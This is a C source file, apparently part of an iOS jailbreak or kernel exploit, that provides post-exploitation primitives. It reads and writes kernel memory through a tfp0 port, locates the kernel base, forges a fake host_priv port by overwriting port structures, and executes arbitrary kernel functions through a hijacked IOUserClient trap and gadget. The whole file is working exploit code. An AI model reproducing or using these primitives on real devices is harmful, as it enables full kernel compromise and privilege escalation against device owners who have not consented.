#include <stdio.h>
#include <stdlib.h>

#include <mach/mach.h>

#include "kutils.h"
#include "kmem.h"
#include "find_port.h"
#include "symbols.h"

uint64_t cached_task_self_addr = 0;
uint64_t task_self_addr() {
  if (cached_task_self_addr == 0) {
    cached_task_self_addr = find_port_address(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
    printf("task self: 0x%llx\n", cached_task_self_addr);
  }
  return cached_task_self_addr;
}

uint64_t ipc_space_kernel() {
  return rk64(task_self_addr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
}

uint64_t current_thread() {
  uint64_t thread_port = find_port_address(mach_thread_self(), MACH_MSG_TYPE_COPY_SEND);
  return rk64(thread_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
}

uint64_t find_kernel_base() {
  uint64_t hostport_addr = find_port_address(mach_host_self(), MACH_MSG_TYPE_COPY_SEND);
  uint64_t realhost = rk64(hostport_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
  
  uint64_t base = realhost & ~0xfffULL;
  // walk down to find the magic:
  for (int i = 0; i < 0x10000; i++) {
    if (rk32(base) == 0xfeedfacf) {
      return base;
    }
    base -= 0x1000;
  }
  return 0;
}
mach_port_t fake_host_priv_port = MACH_PORT_NULL;

// build a fake host priv port
mach_port_t fake_host_priv() {
  if (fake_host_priv_port != MACH_PORT_NULL) {
    return fake_host_priv_port;
  }
  // get the address of realhost:
  uint64_t hostport_addr = find_port_address(mach_host_self(), MACH_MSG_TYPE_COPY_SEND);
  uint64_t realhost = rk64(hostport_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
  
  // allocate a port
  mach_port_t port = MACH_PORT_NULL;
  kern_return_t err;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
  if (err != KERN_SUCCESS) {
    printf("failed to allocate port\n");
    return MACH_PORT_NULL;
  }
  
  // get a send right
  mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
  
  // locate the port
  uint64_t port_addr = find_port_address(port, MACH_MSG_TYPE_COPY_SEND);
  
  // change the type of the port
#define IKOT_HOST_PRIV 4
#define IO_ACTIVE   0x80000000
  wk32(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE|IKOT_HOST_PRIV);
  
  // change the space of the port
  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), ipc_space_kernel());
  
  // set the kobject
  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), realhost);
  
  fake_host_priv_port = port;
  
  return port;
}

extern mach_port_t tfpzero;

size_t kread(uint64_t where, void *p, size_t size) {
    int rv;
    size_t offset = 0;
    while (offset < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_read_overwrite(tfpzero, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
        if (rv || sz == 0) {
            fprintf(stderr, "[e] error reading kernel @%p\n", (void *)(offset + where));
            break;
        }
        offset += sz;
    }
    return offset;
}

size_t kwrite(uint64_t where, const void *p, size_t size) {
    int rv;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_write(tfpzero, where + offset, (mach_vm_offset_t)p + offset, chunk);
        if (rv) {
            fprintf(stderr, "[e] error writing kernel @%p\n", (void *)(offset + where));
            break;
        }
        offset += chunk;
    }
    return offset;
}

uint64_t kalloc(vm_size_t size) {
    mach_vm_address_t address = 0;
    mach_vm_allocate(tfpzero, (mach_vm_address_t *)&address, size, VM_FLAGS_ANYWHERE);
    return address;
}

uint64_t kexecute(mach_port_t user_client, uint64_t fake_client, uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    // When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
    // to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
    // This jumps to our gadget, which returns +0x40 into our fake user_client, which we can modify. The function is then called on the object. But how C++ actually works is that the
    // function is called with the first arguement being the object (referenced as `this`). Because of that, the first argument of any function we call is the object, and everything else is passed
    // through like normal.
    
    // Because the gadget gets the trap at user_client+0x40, we have to overwrite the contents of it
    // We will pull a switch when doing so - retrieve the current contents, call the trap, put back the contents
    // (i'm not actually sure if the switch back is necessary but meh)
    
    uint64_t offx20 = rk64(fake_client+0x40);
    uint64_t offx28 = rk64(fake_client+0x48);
    wk64(fake_client+0x40, x0);
    wk64(fake_client+0x48, addr);
    uint64_t returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
    wk64(fake_client+0x40, offx20);
    wk64(fake_client+0x48, offx28);
    return returnval;
}

